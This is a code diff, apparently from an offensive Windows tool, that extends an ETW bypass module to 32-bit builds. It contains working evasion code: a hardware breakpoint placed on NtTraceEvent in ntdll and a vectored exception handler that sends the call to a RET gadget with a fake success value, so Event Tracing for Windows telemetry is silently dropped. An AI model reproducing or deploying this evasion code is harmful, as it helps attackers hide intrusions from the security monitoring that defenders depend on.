@@ -31,6 +31,14 @@
 static ETW_BYPASS_STATE g_etwState = {0};
 static functionTable* g_functionTable = NULL;
 
+#ifdef _WIN64
+    #define CTX_RIP(ctx) ((ctx)->Rip)
+    #define CTX_RAX(ctx) ((ctx)->Rax)
+#else
+    #define CTX_RIP(ctx) ((ctx)->Eip)
+    #define CTX_RAX(ctx) ((ctx)->Eax)
+#endif
+
 // =============================================================================
 // ETW VEH Handler (called from main VEH in syscalls.cpp)
 // =============================================================================
@@ -48,34 +56,34 @@ LONG ETW_HandleException(EXCEPTION_POINTERS* ExceptionInfo) {
     PCONTEXT ctx = ExceptionInfo->ContextRecord;
 
     // Check which DR register triggered
-    DWORD64 dr0 = ctx->Dr6 & 0xF;  // Debug status register
+    DWORD_PTR dr0 = (DWORD_PTR)(ctx->Dr6 & 0xF);  // Debug status register
     
     // Check if HWBP hit on NtTraceEvent (we set it on DR1-3)
     if (g_etwState.drIndex >= 1 && g_etwState.drIndex <= 3) {
-        DWORD64 drReg = 0;
+        DWORD_PTR drReg = 0;
         switch (g_etwState.drIndex) {
-            case 1: drReg = ctx->Dr1; break;
-            case 2: drReg = ctx->Dr2; break;
-            case 3: drReg = ctx->Dr3; break;
+            case 1: drReg = (DWORD_PTR)ctx->Dr1; break;
+            case 2: drReg = (DWORD_PTR)ctx->Dr2; break;
+            case 3: drReg = (DWORD_PTR)ctx->Dr3; break;
         }
 
-        if (drReg == (DWORD64)g_etwState.ntTraceEventAddr && 
+        if (drReg == (DWORD_PTR)g_etwState.ntTraceEventAddr && 
             (dr0 & (1 << g_etwState.drIndex))) {
             
             g_debugPrint("[ETW] HWBP hit on NtTraceEvent @ 0x%llX (DR%d)", 
-                        (unsigned long long)ctx->Rip, g_etwState.drIndex);
+                        (unsigned long long)CTX_RIP(ctx), g_etwState.drIndex);
 
             // Redirect to RET gadget (immediate return, RAX=0 for success)
             if (g_etwState.retGadget) {
-                ctx->Rip = (DWORD64)g_etwState.retGadget;
-                ctx->Rax = 0;  // NT_SUCCESS
+                CTX_RIP(ctx) = (DWORD_PTR)g_etwState.retGadget;
+                CTX_RAX(ctx) = 0;  // NT_SUCCESS
                 
                 // Clear single-step flag and debug status
                 ctx->EFlags &= ~(1 << 8);  // Clear TF
                 ctx->Dr6 = 0;  // Clear debug status
                 
                 g_debugPrint("[ETW] Redirected to RET @ 0x%llX", 
-                            (unsigned long long)ctx->Rip);
+                            (unsigned long long)CTX_RIP(ctx));
                 return EXCEPTION_CONTINUE_EXECUTION;
             }
         }
@@ -102,7 +110,11 @@ static void* FindRetGadget(functionTable* funcTable) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ntdll;
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
 
+#ifdef _WIN64
     IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)((BYTE*)ntdll + dosHeader->e_lfanew);
+#else
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ntdll + dosHeader->e_lfanew);
+#endif
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
 
     IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
@@ -249,9 +261,9 @@ bool ETW_Enable(functionTable* funcTable) {
 
     // Set HWBP on NtTraceEvent
     switch (drIndex) {
-        case 1: ctx.Dr1 = (DWORD64)g_etwState.ntTraceEventAddr; break;
-        case 2: ctx.Dr2 = (DWORD64)g_etwState.ntTraceEventAddr; break;
-        case 3: ctx.Dr3 = (DWORD64)g_etwState.ntTraceEventAddr; break;
+        case 1: ctx.Dr1 = (DWORD_PTR)g_etwState.ntTraceEventAddr; break;
+        case 2: ctx.Dr2 = (DWORD_PTR)g_etwState.ntTraceEventAddr; break;
+        case 3: ctx.Dr3 = (DWORD_PTR)g_etwState.ntTraceEventAddr; break;
     }
 
     // Enable local breakpoint (L1/L2/L3)
